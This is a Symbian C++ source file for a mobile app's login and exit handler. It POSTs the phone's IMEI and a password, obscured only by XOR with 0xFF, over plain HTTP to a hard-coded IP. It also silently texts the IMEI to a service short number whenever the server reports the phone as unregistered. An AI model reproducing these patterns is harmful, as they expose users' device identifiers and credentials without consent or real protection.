/*
============================================================================
 Name        : HandleLoginOrExit.cpp
 Author      : 
 Version     :
 Copyright   : Your copyright notice
 Description : CHandleLoginOrExit implementation
============================================================================
*/

#include "HandleLoginOrExit.h"

#include "MainEngine.h"
#include "HttpObserver.h"
#include "MControlObserver.h"
#include "HttpManager.h"
#include "CoCoPreDefine.h"

#include "CSmsHandler.h"

_LIT8(KCONNECTURL,"http://59.36.96.182:10891");
//_LIT8(KCONNECTURL,"http://59.36.96.182:10891");


_LIT8(KCrisscrossText,"0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz");

_LIT8(KLoginMsgType,"00000099");
_LIT8(KExitMsgType,"00000098");
_LIT8(KLoginContentType,"text/plain");

_LIT(iRecipientNumber,"1065755851011");

CHandleLoginOrExit::CHandleLoginOrExit(MHandleEventObserver& aObserver,CMainEngine& aMainEngine)
:iObserver(aObserver)
,iMainEngine(aMainEngine)
,iHttpManager(*aMainEngine.GetHttpManager())
,iSystemInfo(NULL)
,iUrl(NULL)
,iTitle(NULL)
,iBuf(NULL)
{
	// No implementation required
	
}


CHandleLoginOrExit::~CHandleLoginOrExit()
{
	CancelSendRequest(EHttpLogin);
	DELETE(iSmsHandler);
	DELETE(iIntNum);
	DELETE(iSystemInfo);
	DELETE(iUrl);
	DELETE(iTitle);
	DELETE(iBuf);
}

CHandleLoginOrExit* CHandleLoginOrExit::NewLC(MHandleEventObserver& aObserver,CMainEngine& aMainEngine)
{
	CHandleLoginOrExit* self = new (ELeave)CHandleLoginOrExit(aObserver, aMainEngine);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
}

CHandleLoginOrExit* CHandleLoginOrExit::NewL(MHandleEventObserver& aObserver,CMainEngine& aMainEngine)
{
	CHandleLoginOrExit* self=CHandleLoginOrExit::NewLC(aObserver, aMainEngine);
	CleanupStack::Pop(); // self;
	return self;
}

void CHandleLoginOrExit::ConstructL()
{
	iTBuf.Append(KCrisscrossText);

	iIntNum=new TInt[62];
	iIntNum[0]  = 0x30^0xFF; 
    iIntNum[1]  = 0x31^0xFF; 
    iIntNum[2]  = 0x32^0xFF; 
    iIntNum[3]  = 0x33^0xFF; 
    iIntNum[4]  = 0x34^0xFF; 
    iIntNum[5]  = 0x35^0xFF; 
    iIntNum[6]  = 0x36^0xFF; 
    iIntNum[7]  = 0x37^0xFF; 
    iIntNum[8]  = 0x38^0xFF; 
    iIntNum[9]  = 0x39^0xFF; 
    iIntNum[10]  = 0x41^0xFF; 
    iIntNum[11]  = 0x42^0xFF; 
    iIntNum[12]  = 0x43^0xFF; 
    iIntNum[13]  = 0x44^0xFF; 
    iIntNum[14]  = 0x45^0xFF; 
    iIntNum[15]  = 0x46^0xFF; 
    iIntNum[16]  = 0x47^0xFF; 
    iIntNum[17]  = 0x48^0xFF; 
    iIntNum[18]  = 0x49^0xFF; 
    iIntNum[19]  = 0x4A^0xFF; 
    iIntNum[20]  = 0x4B^0xFF; 
    iIntNum[21]  = 0x4C^0xFF; 
    iIntNum[22]  = 0x4D^0xFF; 
    iIntNum[23]  = 0x4E^0xFF; 
    iIntNum[24]  = 0x4F^0xFF; 
    iIntNum[25]  = 0x50^0xFF; 
    iIntNum[26]  = 0x51^0xFF; 
    iIntNum[27]  = 0x52^0xFF; 
    iIntNum[28]  = 0x53^0xFF; 
    iIntNum[29]  = 0x54^0xFF; 
    iIntNum[30]  = 0x55^0xFF; 
    iIntNum[31]  = 0x56^0xFF; 
    iIntNum[32]  = 0x57^0xFF; 
    iIntNum[33]  = 0x58^0xFF; 
    iIntNum[34]  = 0x59^0xFF; 
    iIntNum[35]  = 0x5A^0xFF; 
    iIntNum[36]  = 0x61^0xFF; 
    iIntNum[37]  = 0x62^0xFF; 
    iIntNum[38]  = 0x63^0xFF; 
    iIntNum[39]  = 0x64^0xFF; 
    iIntNum[40]  = 0x65^0xFF; 
    iIntNum[41]  = 0x66^0xFF; 
    iIntNum[42]  = 0x67^0xFF; 
    iIntNum[43]  = 0x68^0xFF; 
    iIntNum[44]  = 0x69^0xFF; 
    iIntNum[45]  = 0x6A^0xFF; 
    iIntNum[46]  = 0x6B^0xFF; 
    iIntNum[47]  = 0x6C^0xFF; 
    iIntNum[48]  = 0x6D^0xFF; 
    iIntNum[49]  = 0x6E^0xFF; 
    iIntNum[50]  = 0x6F^0xFF; 
    iIntNum[51]  = 0x70^0xFF; 
    iIntNum[52]  = 0x71^0xFF; 
    iIntNum[53]  = 0x72^0xFF; 
    iIntNum[54]  = 0x73^0xFF; 
    iIntNum[55]  = 0x74^0xFF; 
    iIntNum[56]  = 0x75^0xFF; 
    iIntNum[57]  = 0x76^0xFF; 
    iIntNum[58]  = 0x77^0xFF; 
    iIntNum[59]  = 0x78^0xFF; 
    iIntNum[60]  = 0x79^0xFF; 
    iIntNum[61]  = 0x7A^0xFF; 

	iRegisterPhone=EFalse;
	iAppUpdate=EFalse;
	iContentUpdate=EFalse;
	iSystemInfoFlag=EFalse;
	iNextSystemInfo=EFalse;
	iSmallGateWay=EFalse;
}

void  CHandleLoginOrExit::AddLoginRequest()
{
	GetNameAndPassword();
	if(!iSmsHandler)
		iSmsHandler = CSmsHandler::NewL();


	TBuf8<200> sendData;

	TBuf8<8> bufTemp;

	TBuf8<20> versionInfo;

	versionInfo.Zero ();
	versionInfo.Copy (iMainEngine.GetDesById(ECoCoVersionNumber));

	TInt len=96+versionInfo.Length ();

	bufTemp.AppendNum(len,EHex);

	for(TInt i=0;i<8-bufTemp.Length();i++)
	{
		sendData.AppendNum(0);
	}

	sendData.Append(bufTemp);//包长度
	
	sendData.Append(KLoginMsgType);//消息类型
	
	sendData.Append(_L("00000001"));//消息所带个数
	sendData.Append(_L("00000001"));//消息流水号
	
	sendData.Append(iNamePassword);//帐户密码
	sendData.Append(_L("10"));//协议版本号
	sendData.Append(_L("10"));//校验码
	
	sendData.Append(versionInfo);//包体

	//iMainEngine.WriteLog8(sendData);
	iHttpManager.AddPostRequest(*this,KCONNECTURL,KLoginContentType,sendData,-1,EHttpLogin);
}
void  CHandleLoginOrExit::SendLoginRequest()
{
	GetNameAndPassword();

	if(!iSmsHandler)
		iSmsHandler = CSmsHandler::NewL();


	TBuf8<200> sendData;

	TBuf8<8> bufTemp;

	TBuf8<20> versionInfo;

	versionInfo.Zero ();
	versionInfo.Copy (iMainEngine.GetDesById(ECoCoVersionNumber));

	TInt len=96+versionInfo.Length ();

	bufTemp.AppendNum(len,EHex);

	for(TInt i=0;i<8-bufTemp.Length();i++)
	{
		sendData.AppendNum(0);
	}

	sendData.Append(bufTemp);//包长度
	
	sendData.Append(KLoginMsgType);//消息类型
	
	sendData.Append(_L("00000001"));//消息所带个数
	sendData.Append(_L("00000001"));//消息流水号
	
	sendData.Append(iNamePassword);//帐户密码
	sendData.Append(_L("10"));//协议版本号
	sendData.Append(_L("10"));//校验码
	
	sendData.Append(versionInfo);//包体

	//iMainEngine.WriteLog8(sendData);
	iHttpManager.SendPostRequest(*this,KCONNECTURL,KLoginContentType,sendData,EHttpLogin);

}
void  CHandleLoginOrExit::SendExitRequest()
{
	GetNameAndPassword();
	TBuf8<200> sendData;

	TBuf8<8> bufTemp;

	TInt len=96;

	bufTemp.AppendNum(len,EHex);

	for(TInt i=0;i<8-bufTemp.Length();i++)
	{
		sendData.AppendNum(0);
	}

	sendData.Append(bufTemp);//包长度
	
	sendData.Append(KLoginMsgType);//消息类型
	
	sendData.Append(_L("00000001"));//消息所带个数
	sendData.Append(_L("00000001"));//消息流水号
	sendData.Append(iNamePassword);//帐户密码
	sendData.Append(_L("10"));//协议版本号
	sendData.Append(_L("10"));//校验码

	//iMainEngine.WriteLog8(sendData);
	iHttpManager.SendPostRequest(*this,KCONNECTURL,KLoginContentType,sendData,EHttpExit);
}

void  CHandleLoginOrExit::CancelSendRequest(TInt aType)
{
	iHttpManager.CancelTransaction(this,aType);
}

const TDesC& CHandleLoginOrExit::GetSystemInfo()
{
	return *iSystemInfo;
}

void CHandleLoginOrExit::GetNameAndPassword()
{

	iNamePassword.Zero();
	
	TBuf8<20> bufName;
	bufName.Copy(iMainEngine.GetIMEI());

	TBuf8<10> bufPassword;
	bufPassword.Copy(iMainEngine.GetP()); 

	for(TInt j=0;j<20;j++)
	{
		if(j<bufName.Length())
		{
			iNamePassword.AppendNum(iIntNum[iTBuf.Find(bufName.Mid(j,1))],EHex);
		}
		else
		{
			iNamePassword.Append(_L("FF"));
		}
	}

	for(TInt m=0;m<10;m++)
	{
		if(m<bufPassword.Length())
		{
			iNamePassword.AppendNum(iIntNum[iTBuf.Find(bufPassword.Mid(m,1))],EHex);
		}
		else
		{
			iNamePassword.Append(_L("FF"));
		}
	}
}

//From MOperationObserver
void CHandleLoginOrExit::OperationEvent(TInt aEventType,const TDesC& aEventData,TInt aType)
{
	UtilityTools::WriteLogsL(_L("CHandleLoginOrExit::OperationEvent aEventType = %d,aType = %d"),aEventType,aType);
	if(aEventType==EHttpNoError)
	{
		if(aType==EHttpLogin)
		{
			if(aEventData.Mid(8,8).Compare(_L("10000099"))==0)
			{
				this->CheckGateWay(aEventData.Mid(101,1));
				this->CheckAppUpdate(aEventData.Mid(98,1));
				this->CheckContentUpdate(aEventData.Mid(99,1));
				this->CheckRegisterPhone(aEventData.Mid(97,1));
				this->CheckSystemInfo(aEventData);
			}
			else
			{
				iObserver.HandleResponseEvent(EHttpContentError,aType);
				return;
			}
		}
	}
	else
	{
		iBuf=HBufC::NewL(aEventData.Length());
		iBuf->Des().Copy(aEventData);
	}
	iObserver.HandleResponseEvent(aEventType,aType);
	UtilityTools::WriteLogsL(_L("CHandleLoginOrExit::OperationEvent"));
}
const TDesC& CHandleLoginOrExit::GetInfo()
{
	return *iBuf;
}
const TDesC& CHandleLoginOrExit::GetTitle()
{
	return *iTitle;
}
void  CHandleLoginOrExit::SendSms()
{
	TBuf<30> bufName;

	bufName.Zero();
	bufName.Append(_L("REG:"));
	bufName.Append(iMainEngine.GetIMEI());

	iSmsHandler->SendL( iRecipientNumber, bufName );
}
void CHandleLoginOrExit::CheckRegisterPhone(const TDesC& aText)
{
	if(aText.Compare (_L("0"))==0)
	{
		SendSms();
		iRegisterPhone=EFalse;
	}
	else
	{
		iRegisterPhone=ETrue;
	}
}
void CHandleLoginOrExit::CheckAppUpdate(const TDesC& aText)
{
	if(aText.Compare (_L("1"))==0)
	{
		iAppUpdate=ETrue;
	}
	else
	{
		iAppUpdate=EFalse;
	}
}
void CHandleLoginOrExit::CheckContentUpdate(const TDesC& aText)
{
	if(aText.Compare (_L("1"))==0)
	{
		iContentUpdate=ETrue;
	}
	else
	{
		iContentUpdate=EFalse;
	}
}
void CHandleLoginOrExit::CheckSystemInfo(const TDesC& aText)
{
	UtilityTools::WriteLogsL(_L("CHandleLoginOrExit::CheckSystemInfo text len = %d"),aText.Length());

	if(aText.Length()>110)
	{
		iSystemInfoFlag=ETrue;

		if(aText.Mid(100,1).Compare (_L("1"))==0)
			iNextSystemInfo=ETrue;
		else
			iNextSystemInfo=EFalse;

		iTitle=aText.Mid(107,20).Alloc();
		iSystemInfo=aText.Mid(127,aText.Length()-127-2).Alloc();

	}
	else
	{
		iSystemInfoFlag=EFalse;
		iNextSystemInfo=EFalse;
	}
	UtilityTools::WriteLogsL(_L("CHandleLoginOrExit::CheckSystemInfo End"));
}
void CHandleLoginOrExit::CheckGateWay(const TDesC& aText)
{
	if(aText.Compare (_L("1"))==0)
	{
		iSmallGateWay=ETrue;
	}
	else
	{
		iSmallGateWay=EFalse;
	}
}